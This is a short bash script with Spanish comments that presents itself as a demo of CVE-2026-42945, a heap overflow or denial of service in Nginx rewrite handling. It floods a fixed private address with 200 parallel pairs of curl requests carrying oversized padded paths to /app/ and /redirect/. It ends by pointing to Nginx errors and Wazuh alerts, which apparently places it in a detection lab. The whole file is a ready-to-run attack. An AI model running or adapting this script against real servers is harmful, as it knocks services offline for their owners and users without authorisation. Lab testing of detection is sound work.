#!/bin/bash
# Demo CVE-2026-42945 — Nginx Heap Buffer Overflow / DoS via Rewrite
# Target: 10.78.238.104:80 — endpoint vulnerable /app/ y /redirect/
TARGET="10.78.238.104"
echo "[*] Iniciando demo DoS sobre Nginx 1.29.8 (CVE-2026-42945)"
echo "[*] Enviando 200 requests al endpoint vulnerable /app/"
for i in $(seq 1 200); do
    # Patron que dispara el rewrite con grupo de captura vacio y modificador ?
    curl -s -o /dev/null "http://${TARGET}/app/$(python3 -c "print('A'*1024)")/extra/path/?q=$(python3 -c "print('B'*512)")" &
    # Patron con redirect encadenado
    curl -s -o /dev/null "http://${TARGET}/redirect/$(python3 -c "print('C'*512)")/$(python3 -c "print('D'*256)")/" &
    if [ $((i % 20)) -eq 0 ]; then
        echo "[*] ${i} requests enviadas..."
        sleep 0.2
    fi
done
wait
echo "[!] Ataque completado. Verificar errores en Nginx y alertas en Wazuh."
